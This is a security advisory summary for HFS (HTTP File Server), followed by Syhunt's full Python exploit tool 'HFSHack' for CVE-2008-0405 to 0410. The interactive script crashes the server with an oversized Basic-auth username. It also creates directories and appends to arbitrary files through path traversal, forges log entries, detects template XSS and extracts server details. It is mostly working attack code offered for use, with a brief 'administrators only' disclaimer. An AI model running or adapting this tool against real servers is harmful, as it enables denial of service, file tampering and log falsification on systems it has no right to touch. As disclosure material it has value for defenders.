source: http://www.securityfocus.com/bid/27423/info

HFS (HTTP File Server) is prone to multiple security vulnerabilities, including cross-site scripting issues, an information-disclosure issue, an arbitrary file-creation issue, a denial-of-service issue, a username-spoofing issue, and a logfile-forging issue.

A successful exploit could allow an attacker to deny service to legitimate users, create and execute arbitrary files in the context of the webserver process, falsify log information, or execute arbitrary script code in the browser of an unsuspecting user. Other attacks are also possible. 

#!/usr/bin/python

"""
----------------------------------------------------------------
HFSHack 1.0b (By Felipe M. Aragon And Alec Storm )
----------------------------------------------------------------
* CVE-2008-0409 - Cross-Site Scripting (XSS) and Host Field XSS
* CVE-2008-0410 - Information Disclosure Vulnerability
Affected Versions: HFS 2.0 to and including 2.3(Beta Build 174)
http://www.syhunt.com/advisories/hfs-1-template.txt

* CVE-2008-0405 - Arbitrary File/Folder Creation Vulnerability
* CVE-2008-0406 - Denial of Service (DoS) Vulnerability
Affected Versions: HFS 2.2 to and including 2.3(Beta Build 174)
http://www.syhunt.com/advisories/hfs-1-log.txt

* CVE-2008-0407 - Username Spoofing Vulnerability
* CVE-2008-0408 - Log Forging / Injection Vulnerability
Affected Versions: HFS 1.5g to and including 2.3(Beta Build
174); and possibly HFS version 1.5f
http://www.syhunt.com/advisories/hfs-1-username.txt

Vulnerabilities found by Syhunt (http://www.syhunt.com)
Sandcat can also identify these issues:
http://www.syhunt.com/sandcat
"""

import urllib2, sys, re, commands, StringIO, string, base64

host = '127.0.0.1' # Default Host

help = ('\n'
'open [hostname]\n'
'	This should be called first (unless you want the default host)\n\n'
'checkdos\n'
'	Performs the Log DoS Attack (Makes the server crash)\n\n'
'checkxss\n'
'	Checks for the presence of the Template XSS Vulnerability\n\n'
'manipf [localfilename] [remotefilename]\n'
'	Appends content of a local file to a remote file. Examples:\n'
'	manipf inject.html index.html or ..\\..\index.html\n'
'	Note: If the file does not exists, it will be created.\n\n'
'maniplog [localfilename]\n'
'	Injects content of a local file to the HFS log panel and file\n\n'
'mkd [dirname]\n'
'	Creates directories. Examples:\n'
'	mkd Test or ..\\..\\Windows\\Test\n\n'
'symbols\n'
'	Forces HFS to reveal details about the server\n\n'
'ver\n'
'	Forces HFS to show its version and build, and displays which\n\n'
'	HFSHack commands are available for it\n'
'quit\n'
'	Exits this application'
'\r\n')

readme = (
'(c) 2008 Syhunt Security. All rights reserved.\n\n'
'This tool is provided ''as-is'', without any expressed or implied\n'
'warranty. In no event will the author be held liable for any\n'
'damages arising from the use of this tool.\n\n'
'Permission is granted to anyone to use this tool, and to alter\n'
'it and redistribute it freely, subject to the following\n'
'restrictions:\n\n'
'1. The origin of this tool must not be misrepresented, you must\n'
'   not claim that you wrote the original tool.\n\n'
'2. Altered source versions must be plainly marked as such, and\n'
'   must not be misrepresented as being the original plugin.\n\n'
'3. This notice may not be removed or altered from any source\n'
'   distribution.\n\n'
'If you have any questions concerning this license, please email\n'
'contact _at_ syhunt _dot_ com\n'
)

about = (
'----------------------------------------------------------------\n'
' Syhunt HFSHack 1.0b\n'
'----------------------------------------------------------------\n\n'
'This exploit tool should be used only by system administrators\n'
'(or other people in charge).\n\n'
'Type "readme" and read the text before continuing\n\n'
'If you have already read it, type "help" to view a list of\n'
'commands.'
)

# Extra Details to Obtain
symbol_list = (
'connections;Current number of connections to HFS',
'timestamp;Date and time of the server',
'uptime;Uptime',
'speed-out;Current outbound speed',
'speed-in;Current inbound speed',
'total-out;Total amount of bytes sent',
'total-downloads;Total amount of bytes sent',
'total-hits;Total Hits',
'total-uploads;Total Uploads',
'number-addresses;Current number of connected clients (IPs)',
'number-addresses-ever;Number of unique IPs ever connected',
'number-addresses-downloading;Current number of downloading clients (IPs)',
)

# Affected Versions
re_200801161 = '^HFS(.*?)(2.[0-1]|2.2$|2.2[a-b]|2.3 beta)'
re_200801162 = '^HFS(.*?)(2.2$|2.2[a-b]|2.3 beta)'
re_200801163 = '^HFS(.*?)(1.5[f-g]|1.6|2.[0-1]|2.2$|2.2[a-b]|2.3 beta)'
re_cangetver = '^HFS(.*?)(2.[0-1]|2.2$|2.2[a-b])'

# Common Messages
msg_par_mis = 'Parameter(s) missing.'
msg_done = 'Done.\n'
msg_acc_file = 'Error reading local file (file not found):'
msg_help = 'Type "help" to view a list of commands.'
msg_err_con = 'Error Connecting:'
msg_fail = 'Failed.'
msg_req_ok = 'Request accepted.'

uagent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; Syhunt HFSHack)';
path = '/' # Default Path

def dorequest(hpath,auth_data,s_msg,f_msg):
        globals()["rcvd"] = ''
        globals()["banner"] = ''
	url = 'http://'+host+hpath
	try:
		opener = urllib2.build_opener(url)
		opener.addheaders = [('User-agent', uagent)]
		if auth_data != '':
			opener.addheaders = [('Authorization', 'Basic '+auth_data)]
		globals()["rcvd"] = opener.open(url).readlines()
	        if 'server' in opener.open(url).headers:
			globals()["banner"] = opener.open(url).headers['server']
	except Exception, msg:
		if f_msg != '':
			print f_msg,msg
		return False
	else:
		if s_msg != '':
			print s_msg
		return True

def genbase64str(string):
	base64str = base64.encodestring(string);
        base64str = base64str.replace("\n","")
	return base64str

def readlocalfile(filename):
    file = open(filename, "r")
    text = file.readlines()
    file.close()
    print text
    filecontentstr = ''
    for l in text:
	filecontentstr = filecontentstr+l
    return filecontentstr

def ishostavailable():
	return dorequest(path,'','',msg_err_con)

def getservinfo(symbol,desc):
	base64str = base64.encodestring('<id>%'+symbol+'%</id>');
	if dorequest(path,base64str,'',msg_err_con):
		for l in rcvd:
			hfsver = re.findall('<id>(.*?)</id>', l)
			for r in hfsver:
				if r != []:
					hfsverdec = urllib2.unquote(hfsver[0])
					if desc != '':
						print desc+': '+hfsverdec
					return hfsverdec
	else:
		return ''

def getallservinf():
	for l in symbol_list:
		curl = l.split(';')
		getservinfo(curl[0],curl[1])

def hfsmkdir(dirname):
	base64str = genbase64str('\\..\\'+dirname+'\\')+'AA';
	dorequest(path,base64str,msg_req_ok,msg_fail)

def shutdownhfs():
	dosstr = genbase64str('a' * 270 + ':')
	if dorequest(path,dosstr,msg_fail,'DoS executed.'):
        	dorequest(path,'','Host is still up.','Host is now down.')

def hfsappendtofile(filename,string):
	base64str = genbase64str('\\..\\'+filename)+'AA';
	dorequest('/?%0a'+string,base64str,msg_req_ok,msg_fail)

def hfsinjecttolog(string):
	base64str = genbase64str(string);
	dorequest('/',base64str,msg_req_ok,msg_fail)

def procparams(cmd):
	try:
		if len(cmd) > 0:
			if cmd[1] != []:
				globals()["host"] = cmd[1]
	except:
		print "No target info provided. Using localhost"
	
def checkxss():
	if ishostavailable():
		curver = getservinfo('version','')
		if curver != '':
			return 'XSS Found'
		else:
			return 'Not Vulnerable'
	else:
		return msg_fail

def isbanner(regex):
	p = re.compile(regex)
	m = p.match(banner)
	return m

def showacceptedcmds():
	cmds = 'None (This server is not vulnerable)';
	if isbanner(re_200801161):
		cmds = 'checkxss symbols ver'
	if isbanner(re_200801162):
		cmds = cmds+' manipf mkd checkdos'
	if isbanner(re_200801163):
		cmds = cmds+' maniplog'
	print '\nAvailable commands for this server:'
	print ' '+cmds+'\n'

def showver():
	cangetver = True
	if banner != '':
		server_name = banner.split()
		print banner
		if server_name[0] != 'HFS':
			print 'Not running HFS!'
			cangetver = False
		else:
			if isbanner(re_cangetver):
				print 'Confirming version...'
			else:
				cangetver = False
	else:
		print 'No version information found.'
		print 'The "Send HFS identifier" option is probably disabled.'
		print 'Trying to force HFS to display its version...'
	if cangetver == True:
		idver = getservinfo('version','HFS version number')
		idbuild = getservinfo('build','HFS build number')
		globals()["banner"] = 'HFS '+idver+' '+idbuild
	showacceptedcmds()

def result(s):
	cmd = s.split()
	if len(cmd) > 0:
		curcmd = cmd[0]
		result = 'Invalid command. Type "help" for list of commands.'
		if curcmd == 'open':
			procparams(cmd)
			if ishostavailable():
				showver()
				result = 'Connected.\n'
			else:
				result = msg_fail
		elif curcmd == 'symbols':
			if ishostavailable():
				showver()
				print 'Forcing HFS to reveal more details...'
				getallservinf()
			result = msg_done
		elif curcmd == 'ver':
			if ishostavailable():
				showver()
			result = msg_done
		elif curcmd == 'mkd':
			if len(cmd) > 1:
				if cmd[1] != []:
					hfsmkdir(cmd[1])
				result = msg_done
			else:
				result = msg_par_mis
		elif curcmd == 'manipf':
			if len(cmd) > 2:
				try:
					localfilecontent = readlocalfile(cmd[1])
				except Exception, msg:
					result = msg_acc_file,msg
				else:
        				localfilecontent = localfilecontent.replace("\n","%0a")
					hfsappendtofile(cmd[2],localfilecontent)
					result = msg_done
			else:
				result = msg_par_mis
		elif curcmd == 'maniplog':
			if len(cmd) > 1:
				try:
					localfilecontent = readlocalfile(cmd[1])
				except Exception, msg:
					result = msg_acc_file,msg
				else:
					hfsinjecttolog(localfilecontent)
					result = msg_done
			else:
				result = msg_par_mis
		elif curcmd == 'checkdos':
			shutdownhfs()
			result = msg_done
		elif curcmd == 'checkxss':
			result = checkxss()
		elif curcmd == 'help':
			result = help
		elif curcmd == 'readme':
			result = readme
		elif curcmd == 'quit':
			result = 'Bye!'
		return result
	else:
		return msg_help

print about

s = ""
while s != "quit":
	try: s = raw_input(">")
	except EOFError:
		s = "quit"
		print s
	print result(s)